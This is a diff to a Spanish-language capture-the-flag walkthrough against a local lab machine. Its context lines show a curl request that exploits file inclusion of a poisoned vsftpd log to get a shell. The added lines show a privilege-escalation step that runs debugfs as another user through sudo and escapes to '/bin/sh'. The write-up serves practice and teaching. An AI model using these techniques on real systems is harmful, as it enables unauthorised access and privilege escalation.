@@ -57,7 +57,7 @@ curl -G "http://172.17.0.2/index.php" --data-urlencode "studio=/var/log/vsftpd.l
 ```
 Usamos ```curl``` ya que si copiamos directamente el comando en la barra de busqueda no se ejecutara ya que google no codifica automaticamente los caracteres iniciales, por lo que lo ejecutaremos con ```curl``` y en la terminal en la que estabamos escuchando ganaremos acceso a la maquina.
 
-## Paso N6: Subiendo privilegios
+## Paso N6: Accediendo a usuarios del sistema
 ejecutamos el comando sudo -l y nos devuelve lo siguiente:
 ```
 (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
@@ -65,7 +65,13 @@ ejecutamos el comando sudo -l y nos devuelve lo siguiente:
 Para ganar acceso al usuario hannah ejecutaremos el siguiente comando:
 ```
 sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+
+!/bin/sh
 ```
+Una vez ejecutado, accederemos al usuario hannah.
+
+## Paso N7: 
+
 
 
 
